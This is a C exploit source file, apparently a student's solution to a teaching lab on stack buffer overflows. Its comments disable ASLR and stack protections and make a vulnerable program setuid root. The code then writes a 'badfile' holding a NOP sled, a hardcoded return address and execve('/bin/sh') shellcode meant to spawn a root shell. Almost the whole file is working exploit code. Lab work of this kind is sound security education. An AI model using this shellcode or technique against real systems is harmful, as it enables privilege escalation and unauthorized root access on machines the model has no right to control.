//counter measures
//sudo sysctl -w kernel.randomize_va_space=0
//sudo ln -sf /bin/zsh /bin/sh

//gcc -g -o stack -z execstack -fno-stack-protector stack.c
//sudo chown root stack
//sudo chmod 4755 stack
//gdb stack
	//- b bof
	//- r
	//- p $ebp
	//- p &buffer
	//- p address of ebp - address of buffer
//(address of ebp - address of buffer) is a hex number, convert it to decimal 
//and then add 4bytes and again convert it to hex==> 
//this hex will be required position from buffer where I will place buffer starting address+offset  

//rm badfile
//gcc -g -o exploit exploit.c
//./exploit
//hexdump -C badfile
//./stack



#include <stdlib.h>
#include <stdio.h>
#include <string.h>


char shellcode[] = 

	"\x31\xc0"
	"\x50"
	"\x68""//sh" 
	"\x68""/bin"
	"\x89\xe3"
	"\x50" 
	"\x53" 
	"\x89\xe1"
	"\x99" 
	"\xb0\x0b" 
	"\xcd\x80"
;


void main(int argc, char** argv){
	char buffer[517];
	FILE *badfile;

	memset(&buffer, 0x90, 517);

	//TO_DO
	*((long *) (buffer+0x2e))= 0xbfffeaae + 0x57;
	memcpy(buffer+sizeof(buffer)-sizeof(shellcode),shellcode,sizeof(shellcode));

	printf("%s\n",buffer );


	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
	

}









